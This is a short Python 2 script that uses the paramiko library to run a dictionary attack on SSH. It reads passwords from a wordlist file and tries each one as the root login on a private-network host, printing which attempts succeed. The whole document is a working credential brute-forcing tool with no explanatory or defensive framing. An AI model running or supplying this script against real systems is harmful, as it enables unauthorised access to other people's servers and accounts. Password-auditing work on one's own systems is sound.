import paramiko

def dict(ip,port,user,password):
	f = open('/root/dict.txt','r')
	fpasswd = f.readlines()
	for passwd in fpasswd:
		ssh(ip,port,user,passwd.strip())

def ssh(ip,port,user,passwd):
	try:
		ssh=paramiko.SSHClient()
		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		ssh.connect(ip,port,user,passwd,timeout=1)
		ssh.close()
		print 'password:'+str(passwd),'ok'
	except:
		print 'password:'+str(passwd),'error'

if __name__ == '__main__':
	ip='192.168.1.169'
	port=22
	user='root'
	password='toor'
	dict(ip,port,user,password)
